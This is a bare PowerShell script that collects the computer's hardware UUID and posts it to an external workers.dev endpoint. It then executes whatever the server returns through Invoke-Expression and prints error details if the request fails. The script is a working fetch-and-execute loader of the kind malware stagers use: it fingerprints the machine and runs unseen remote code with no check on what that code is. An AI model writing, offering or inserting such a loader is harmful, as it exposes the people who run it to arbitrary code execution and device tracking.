$hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
$body = @{ hwid = $hwid } | ConvertTo-Json

try {
    $response = Invoke-RestMethod -Uri "https://flat-art-959b.rov170652.workers.dev" -Method Post -Body $body -ContentType "application/json"
    Write-Output "Success response received!"
    Invoke-Expression $response
} catch {
    Write-Host "--- WORKER ERROR ---" -ForegroundColor Red
    $stream = $_.Exception.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($stream)
    Write-Host $reader.ReadToEnd() -ForegroundColor Yellow
}
